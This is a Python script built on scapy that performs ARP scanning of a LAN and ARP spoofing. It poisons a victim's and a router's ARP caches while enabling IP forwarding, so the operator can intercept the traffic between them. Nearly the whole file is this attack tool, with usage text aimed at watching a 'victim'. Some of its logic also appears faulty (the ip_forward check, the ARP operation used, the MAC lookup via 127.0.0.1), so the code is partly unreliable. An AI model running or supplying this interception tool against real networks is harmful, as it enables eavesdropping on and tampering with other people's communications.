from scapy.all import Ether, ARP, srp, sendp
import os, sys, time
import requests
import pyfiglet, termcolor
from datetime import datetime

def arp_scan(ip):
    """Perform an arp scan on an ip or a range of ip

    Args:
        ip (str): The ip's victim or a range of ip

    Returns:
        list: a list of host who responded to our request
    """
    result = []
    
    # This condition calculate the number of host from the network's mask
    # Or specify 1 if it's not a range of ips
    if "/" in ip:
        mask = ip.split("/")
        number_hosts = pow(2, (32 - int(mask[1])))
    else:
        mask = ip.split("/")
        number_hosts = 1
    print(f"Starting ARP Scan on {mask[0]} with {number_hosts} hosts")

    # Make a packet for an ARP request
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)    

    # srp() sends ARP request AND wait for the response
    ans, _ = srp(request, timeout=2, retry=1, verbose=0)
    # Append ips, macs, and manufacturer in result list for those who responded
    for _, received in ans:
        result.append({'IP': received.psrc, 'MAC': received.hwsrc, 'manu': show_manufacturer(received.hwsrc)})    

    return result

def show_manufacturer(mac):
    """Make an API request to get manufacturer name from a mac address

    Args:
        mac (string): current mac address

    Returns:
        string: manufacturer's name
    """
    # URL to the API
    mac_url = 'https://macvendors.co/api/%s'
    # Make API GET request
    r = requests.get(mac_url % mac)
    # Convert response in a json type
    json = r.json()
    return json['result']['company']

def enable_linux_iproute():
    """Enables IP route (IP Forward) in Linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    is_forward = False
    with open(file_path) as f:
        if f.read() == 1:
            is_forward = True
            return
    if not is_forward:
        with open(file_path, "w") as f:
            print(1, file=f)

def get_mac(ip):
    """Returns MAC address of any device connected to the network
    Similar as arp_scan() but it returns directly MAC address and not a list with other informations 

    Args:
        ip (string): the ip of the victim
    """
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)    
    ans, _ = srp(request, timeout=2, retry=1, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, my_mac):
    """Spoofs `target_ip` saying that we are `host_ip`

    Args:
        target_ip (string): The ip's victim
        host_ip (string): Your ip address
    """
    
    # craft the arp 'who-has' operation packet, in other words: an ARP response
    arp_response = Ether() / ARP(op='who-has', hwsrc=my_mac, pdst=target_ip, psrc=host_ip)
    sendp(arp_response, verbose=0)
    print(".", end=" ", flush=True)

def restore(target_ip, host_ip):
    """Restores the normal process of a regular network
    This is done by sending the original informations to `target_ip`

    Args:
        target_ip (string): The ip's victim
        host_ip (string): The impersonate ip address
    """
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)

    # we send each reply seven times for a good measure
    sendp(arp_response, verbose=0, count=7)

def show_help():
    """Show documentation and usage about this script
    """
    # Pyfiglet make some cool banner
    custom_fig = pyfiglet.Figlet(font='slant')
    print(custom_fig.renderText('ARP spoofer'))
    
    print(f"""
    Usage:
        {os.path.basename(__file__)} -sc <ip>
        {os.path.basename(__file__)} -sp <victim_ip> <host_to_impersonate>

    Options:
        -sc    Scan for a specific ip or a range of ip by specifying network's mask
               Like 192.168.1.1 for a specific ip or 192.168.1.1/24 for a range of ip
        
        -sp    Impersonate a device (for example a router) and tell who you are to you
               your victim in order to see its communication between your victim and router  

        -h    Show this screen
    """)

def main():
    # Get options and arguments
    opts = [opt for opt in sys.argv[1:] if opt.startswith("-")]
    args = [arg for arg in sys.argv[1:] if not arg.startswith("-")]

    if not opts:
        show_help()
        sys.exit()
    
    if "-h" in opts:
        show_help()
        sys.exit()
    
    if "-sc" in opts:
        t1 = datetime.now()
        result = arp_scan(args[0])

        # Header's table
        print('{0} {1:>18} {2:>29}'.format('IP', 'MAC', 'Manufacturer'))

        # Print result in a nice align way
        for mapping in result:
            ip = mapping['IP']
            mac = mapping['MAC']
            manufacturer = mapping['manu']

            space = 34 - len(ip)
            f = '{0} {1:>%d}    {2:<2}' % (space)

            print(f.format(ip, mac, manufacturer))
        t2 = datetime.now()
        termcolor.cprint("Scanning Completed in " + str(t2-t1), "green")

    elif "-sp" in opts:
        if len(args) != 2:
            show_help()
            termcolor.cprint("You need to specify a target and a host ip", "red")
            sys.exit()
        else:
            enable_linux_iproute()

            target = args[0]
            host = args[1]

            print("[!] Sending spoofed packet to target")
            my_mac = get_mac("127.0.0.1")

            try:
                while True:
                    # telling the `target` that we are the `host`
                    spoof(target, host, my_mac)
                    # telling the `host` that we are the `target`
                    spoof(host, target, my_mac)
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[!] Detected CTRL+C! Restoring the network, please wait...")
                restore(target, host)
                restore(host, target)
    else:
        raise SystemExit(show_help())

if __name__ == "__main__":
    main()